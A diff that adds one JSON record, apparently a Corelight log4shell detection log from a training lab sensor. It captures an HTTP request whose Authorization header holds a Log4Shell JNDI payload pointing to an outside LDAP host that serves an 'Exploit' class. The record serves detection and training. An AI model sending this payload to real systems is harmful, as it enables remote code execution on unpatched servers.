@@ -1,0 +1,18 @@
+{
+  "_path": "log4shell",
+  "_system_name": "sensor.cyberlab-20250109a-classic.training.corelight.io",
+  "_write_ts": "2025-01-10T00:58:43.214320Z",
+  "ts": "2025-01-10T00:58:43.214320Z",
+  "uid": "C6JWdp1PAAxyF0wBbg",
+  "http_uri": "/",
+  "uri": "45.83.193.150:1389/Exploit",
+  "stem": "45.83.193.150:1389",
+  "target_host": "45.83.193.150",
+  "target_port": "1389",
+  "method": "GET",
+  "is_orig": true,
+  "name": "AUTHORIZATION",
+  "value": "Bearer ${jndi:ldap://45.83.193.150:1389/Exploit}",
+  "matched_name": false,
+  "matched_value": true
+}
